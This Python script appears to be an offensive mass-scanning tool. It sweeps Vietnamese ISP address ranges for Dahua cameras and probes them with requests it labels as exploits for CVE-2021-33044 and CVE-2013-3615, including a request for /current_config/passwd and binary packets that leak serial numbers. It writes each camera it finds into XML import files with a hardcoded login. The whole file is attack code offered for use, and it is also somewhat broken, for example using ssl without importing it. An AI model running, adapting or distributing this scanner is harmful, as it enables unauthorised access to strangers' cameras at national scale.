#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: Gzii
import socket
import struct
import hashlib
import base64
import sys
import threading
import queue
import xml.etree.ElementTree as ET
import time
import os
import ipaddress
from datetime import datetime
THREADS = 200
TIMEOUT = 3
SCAN_PORTS = [37777, 80, 443, 554, 8000, 8080]
BATCH_SIZE = 10 
OUTPUT_DIR = "scan_results" 
# List IP ranges của các ISP Việt Nam
VIETNAM_IP_RANGES = [
    # VNPT
    "14.160.0.0/11", "14.224.0.0/11", "27.0.0.0/14", "27.64.0.0/12",
    "42.112.0.0/12", "103.199.16.0/22", "113.160.0.0/11", "113.176.0.0/12",
    "115.72.0.0/13", "115.84.0.0/15", "116.96.0.0/12", "117.0.0.0/11",
    "118.68.0.0/14", "123.16.0.0/12", "125.212.128.0/17", "171.224.0.0/11",
    "203.210.128.0/17", "222.252.0.0/14",
    # Viettel
    "1.52.0.0/14", "27.72.0.0/13", "42.96.0.0/13", "115.72.0.0/13",
    "116.96.0.0/12", "117.0.0.0/13", "118.68.0.0/14", "125.235.0.0/16",
    "171.224.0.0/11", "203.113.128.0/18",
    # FPT Telecom  
    "42.112.0.0/12", "113.22.0.0/16", "118.69.0.0/16", "183.80.0.0/16",
    "210.245.0.0/17",
    # CMC Telecom
    "103.21.148.0/22", "103.74.112.0/22", "183.91.0.0/19",
    # SCTV
    "103.28.36.0/22", "210.211.96.0/19",
    # HTC Telecom  
    "101.99.0.0/18", "103.56.152.0/22",
    # GMO-Z.com
    "103.152.164.0/22", "150.95.96.0/20",
    # khác
    "103.101.136.0/22", "103.108.120.0/22", "103.111.208.0/22",
    "103.121.88.0/22", "103.126.248.0/22", "103.130.72.0/22",
    "103.137.184.0/22", "103.140.236.0/22", "103.147.180.0/22",
    "103.156.20.0/22", "103.159.212.0/22", "103.167.148.0/22",
    "103.176.176.0/22", "103.183.112.0/22", "103.186.100.0/22",
    "103.191.172.0/22", "103.197.184.0/22", "103.220.84.0/22",
    "103.221.216.0/22", "103.226.244.0/22", "103.230.60.0/22",
    "103.238.68.0/22", "103.245.92.0/22", "103.249.20.0/22",
    #IP mới
    "45.117.76.0/22", "45.119.84.0/22", "45.124.84.0/22",
    "103.10.220.0/22", "103.11.140.0/22", "103.14.100.0/22",
    "103.234.96.0/22", "103.248.208.0/22",
]
class DahuaVNScanner:
    def __init__(self):
        self.results = []
        self.q = queue.Queue()
        self.lock = threading.Lock()
        self.cam_count = 0
        self.batch_count = 0
        self.total_scan = 0
        self.start_time = time.time()        
        if not os.path.exists(OUTPUT_DIR):
            os.makedirs(OUTPUT_DIR)
    def save_batch_xml(self, force=False):
        """Lưu XML khi đủ 10 camera hoặc force save"""
        with self.lock:
            if len(self.results) >= BATCH_SIZE or (force and len(self.results) > 0):
                self.batch_count += 1
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"{OUTPUT_DIR}/dahua_cameras_batch_{self.batch_count:04d}_{timestamp}.xml"
                root = ET.Element("DeviceManager", version="2.0")
                for result in self.results:
                    device = ET.SubElement(root, "Device",
                                         name=result['name'],
                                         domain=result['domain'],
                                         port=str(result['port']),
                                         username=result['username'],
                                         password=result['password'],
                                         protocol=result['protocol'],
                                         connect=result['connect'])
                tree = ET.ElementTree(root)
                tree.write(filename, encoding='UTF-8', xml_declaration=True)
                
                print(f"\n{'='*60}")
                print(f"[💾] ĐÃ XUẤT FILE: {filename}")
                print(f"[📊] Tổng camera đã quét: {self.cam_count}")
                print(f"[⏱️] Thời gian chạy: {time.time() - self.start_time:.1f}s")
                print(f"{'='*60}\n")
                self.results = []
    def exploit_dahua_p2p(self, ip, port):
        """Khai thác CVE-2021-33044 & CVE-2013-3615"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            sock.connect((ip, port))
            if port in [80, 8080, 443]:
                # HTTP/HTTPS scan
                request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Dahua/1.0\r\n\r\n"
                if port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock)
                sock.send(request.encode())
                response = sock.recv(2048)
                if b'Dahua' in response or b'MobileDVR' in response or b'web_client' in response:
                    #CVE-2013-3615
                    exploit_req = f"GET /current_config/passwd HTTP/1.1\r\nHost: {ip}\r\n\r\n"
                    sock.send(exploit_req.encode())
                    time.sleep(0.5)
                    sock.close()
                    return True
            else:
                # P2P protocol scan (port 37777, etc.)
                # Magic packet Dahua
                magic = b'\x20\x00\x00\x00'
                # Command: get device serial
                cmd = b'\x14\x00\x00\x00'
                sock.send(magic + cmd)
                response = sock.recv(1024)
                sock.close()
                if len(response) > 16:
                    return True
        except:
            pass
        return False
    def extract_serial(self, ip, port):
        """Lấy serial number của camera"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            sock.connect((ip, port))
            # Payload lấy serial - CVE-2021-33044 P2P info leak
            payload = b'\x20\x00\x00\x00\x14\x00\x00\x00\x01\x00\x00\x00'
            payload += struct.pack('!I', 64)
            payload += b'\x00' * 64
            sock.send(payload)
            response = sock.recv(2048)
            sock.close()
            if len(response) > 20:
                # Parse serial từ response
                for i in range(len(response) - 12):
                    chunk = response[i:i+20]
                    if (b'L0' in chunk or b'PAG' in chunk or b'PAJ' in chunk) and chunk[0:2].decode('ascii', errors='ignore').isalnum():
                        serial = ''.join(c for c in chunk.decode('ascii', errors='ignore') if c.isalnum())
                        if len(serial) >= 13:
                            return serial[:13]
        except:
            pass
        return None
    def generate_device_xml(self, serial, ip, port):
        """Tạo device entry theo format yêu cầu"""
        return {
            'name': f"FCAM_{self.cam_count:04d}",
            'domain': serial,
            'port': port,
            'username': 'fcam',
            'password': 'jwGxns5ZMZaxPCqlpA7d2l1PW+0PZy3DNW41gxhMIeYvebzvoHKRy09V2iU2p6qWe2BQ',
            'protocol': '1',
            'connect': '19'
        }
    def worker(self, ip):
        """Worker thread quét từng IP"""
        self.total_scan += 1
        for port in SCAN_PORTS:
            if self.exploit_dahua_p2p(ip, port):
                serial = self.extract_serial(ip, port)
                if serial:
                    with self.lock:
                        self.cam_count += 1
                        device = self.generate_device_xml(serial, ip, port)
                        self.results.append(device)
                        print(f"[X] #{self.cam_count} | {device['name']} | {serial} | {ip}:{port}")
                        if len(self.results) >= BATCH_SIZE:
                            self.save_batch_xml()
                break
        if self.total_scan % 1000 == 0:
            elapsed = time.time() - self.start_time
            rate = self.total_scan / elapsed if elapsed > 0 else 0
            print(f"[⏳] Đã quét: {self.total_scan} IPs | Tốc độ: {rate:.1f} IP/s | Đã tìm: {self.cam_count} cams")
    def scan_vietnam(self):
        """Quét toàn bộ IP Việt Nam"""
        print("""
╔══════════════════════════════════════════════════╗
║   DAHUA P2P SCANNER - VIETNAM EDITION          ║
║   CVE-2021-33044 & CVE-2013-3615               ║
║   Tự động scan IP Việt Nam                     ║
║   Cứ 10 camera → Auto xuất XML                 ║
║   Target: easy4ipcloud.com P2P Dahua           ║
╚══════════════════════════════════════════════════╝
        """)
        total_ips = 0
        for subnet in VIETNAM_IP_RANGES:
            try:
                network = ipaddress.IPv4Network(subnet, strict=False)
                total_ips += network.num_addresses
                for ip in network:
                    self.q.put(str(ip))
            except:
                continue
        print(f"[*] Tổng số IP Việt Nam sẽ quét: {total_ips:,}")
        print(f"[*] Số threads: {THREADS}")
        print(f"[*] Xuất file mỗi: {BATCH_SIZE} camera")
        print(f"[*] Thư mục output: {OUTPUT_DIR}/")
        print(f"\n{'='*60}\n")
        def thread_worker():
            while not self.q.empty():
                try:
                    ip = self.q.get(timeout=1)
                    self.worker(ip)
                    self.q.task_done()
                except queue.Empty:
                    break
        threads = []
        for i in range(THREADS):
            t = threading.Thread(target=thread_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        try:
            while not self.q.empty():
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("\n[!] User interrupt. Đang save dữ liệu còn lại...")
        self.save_batch_xml(force=True)
        print("\n" + "="*60)
        print(f" HOÀN THÀNH!")
        print(f" Tổng IP đã quét: {self.total_scan:,}")
        print(f" Tổng camera tìm thấy: {self.cam_count}")
        print(f" Số file XML đã xuất: {self.batch_count}")
        print(f" Tổng thời gian: {time.time() - self.start_time:.1f}s")
        print("="*60)

if __name__ == "__main__":
    scanner = DahuaVNScanner()
    scanner.scan_vietnam()
